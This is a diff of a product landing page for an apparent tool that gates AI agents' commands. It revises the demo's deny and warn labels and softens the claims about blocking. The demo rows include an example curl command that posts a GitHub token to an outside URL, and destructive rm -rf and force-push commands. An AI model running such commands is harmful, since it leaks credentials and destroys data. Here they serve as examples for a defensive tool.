@@ -802,9 +802,9 @@
               <span>local</span>
             </div>
             <div class="hero-gate-rows" role="listbox" aria-label="Sample tool calls">
-              <button type="button" class="hero-gate-row is-selected" role="option" aria-selected="true" data-gate="secret">curl -d "$GITHUB_TOKEN" https://...   → <span class="deny">DENY</span> (secret, every install)</button>
+              <button type="button" class="hero-gate-row is-selected" role="option" aria-selected="true" data-gate="secret">curl -d "$GITHUB_TOKEN" https://...   → <span class="deny">DENY</span> (secret)</button>
               <button type="button" class="hero-gate-row" role="option" aria-selected="false" data-gate="force">git push --force origin main          → <span class="warn">WARN</span> (deny only in strict mode)</button>
-              <button type="button" class="hero-gate-row" role="option" aria-selected="false" data-gate="rm">rm -rf ./prod-db &amp;&amp; git reset --hard  → <span class="warn">WARN</span> (3 negatives, then strict mode)</button>
+              <button type="button" class="hero-gate-row" role="option" aria-selected="false" data-gate="rm">rm -rf ./prod-db &amp;&amp; git reset --hard  → <span class="warn">WARN</span> (deny only in strict mode)</button>
             </div>
             <p class="hero-gate-note" id="hero-gate-note" aria-live="polite"></p>
           </div>
@@ -1464,9 +1464,9 @@ next      decision recorded before execution</pre>
       const rows = demo.querySelectorAll('.hero-gate-row');
       let selected = 'secret';
       const notes = {
-        secret: 'Already denied on every install. A thumbs-down does not change a secret floor.',
-        force: 'One thumbs-down stores a local lesson. This stays a warning. Deny needs strict mode, or three repeated negatives.',
-        rm: 'One thumbs-down stores a local lesson and promotes a warning. Deny needs three repeated negatives, and strict mode, not this click.',
+        secret: 'Illustrative example, not a recorded result. Matching destructive actions warn by default; advisory integrations do not guarantee execution blocking.',
+        force: 'Illustrative example, not a recorded result. Matching destructive actions warn by default; advisory integrations do not guarantee execution blocking.',
+        rm: 'Illustrative example, not a recorded result. Matching destructive actions warn by default; advisory integrations do not guarantee execution blocking.',
       };
       rows.forEach(function (row) {
         row.addEventListener('click', function () {
@@ -1598,4 +1598,4 @@ next      decision recorded before execution</pre>
   })();
 </script>
 </body>
-            </html>
+</html>
